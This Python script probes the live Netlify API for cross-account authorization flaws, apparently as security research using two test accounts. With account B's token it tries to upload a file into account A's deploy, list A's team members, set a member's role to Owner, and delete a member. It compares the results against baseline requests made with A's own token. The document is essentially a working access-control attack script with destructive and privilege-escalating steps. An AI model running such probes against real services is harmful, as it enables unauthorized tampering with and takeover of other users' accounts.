# -*- coding: utf-8 -*-
"""1) deploy PUT files 基线修复版  2) members 族: slug 参数跨账号矩阵
已知: A slug=1643584176, B slug=libobo01, ACC_A=6a979dd2ae93f47d55b62897, ACC_B=6a97b6454fef0db964f75db6
A user uuid(从 deploy.user_id)=6a979dd2ae93f47d55b62895
"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import TOKEN_A, TOKEN_B

DID = '6a97c9e3083c963fd210b895'
ctx = ssl.create_default_context()
SLUG_A = '1643584176'
SLUG_B = 'libobo01'
USER_A = '6a979dd2ae93f47d55b62895'
USER_B = '6a97b6454fef0db964f75db4'
ACC_A = '6a979dd2ae93f47d55b62897'

def req(method, path, body=None, raw=None, token=None, ctype='application/json', timeout=25):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': ctype}
    if token: h['Authorization'] = 'Bearer ' + token
    if raw is not None:
        b = raw
    else:
        b = json.dumps(body).encode() if body is not None else None
    conn.request(method, path, body=b, headers=h)
    r = conn.getresponse()
    raw2 = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw2 = brotli.decompress(raw2)
    elif enc == 'gzip': raw2 = gzip.decompress(raw2)
    st = r.status
    txt = raw2.decode('utf-8', 'ignore')
    conn.close()
    return st, txt

def probe(tag, m, p, body=None, raw=None, tok=None):
    st, b = req(m, p, body=body, raw=raw, token=tok)
    print('%-46s %s | %s' % (tag, st, b[:130].replace('\n', ' ')))
    return st, b

print('== 1. deploy PUT files 基线(A 自己, ready deploy)==')
probe('A PUT files own(裸字节)', 'PUT', '/deploys/%s/files/zzz2.txt' % DID, raw=b'hello', tok=TOKEN_A,
      )
probe('B PUT files A-deploy', 'PUT', '/deploys/%s/files/zzz3.txt' % DID, raw=b'pwn', tok=TOKEN_B)
probe('A POST lock own + unlock', 'POST', '/deploys/%s/lock' % DID, tok=TOKEN_A)
probe('A POST unlock own', 'POST', '/deploys/%s/unlock' % DID, tok=TOKEN_A)

print()
print('== 2. members 族基线(B 自己的 team)==')
probe('B GET own members', 'GET', '/%s/members' % SLUG_B, tok=TOKEN_B)

print()
print('== 3. members 跨账号(A slug, B token)==')
probe('B GET A members', 'GET', '/%s/members' % SLUG_A, tok=TOKEN_B)
probe('B GET A members (uuid acc)', 'GET', '/%s/members' % ACC_A, tok=TOKEN_B)
probe('B GET A member 详情(USER_A)', 'GET', '/%s/members/%s' % (SLUG_A, USER_A), tok=TOKEN_B)
probe('B PUT A member 角色(USER_A owner?)', 'PUT', '/%s/members/%s' % (SLUG_A, USER_A),
      {'role': 'Owner'}, tok=TOKEN_B)
probe('B DELETE A member', 'DELETE', '/%s/members/%s' % (SLUG_A, USER_A), tok=TOKEN_B)

print()
print('== 4. A token 基线对照 ==')
probe('A GET own members', 'GET', '/%s/members' % SLUG_A, tok=TOKEN_A)
probe('A GET own member detail', 'GET', '/%s/members/%s' % (SLUG_A, USER_A), tok=TOKEN_A)
print('done')
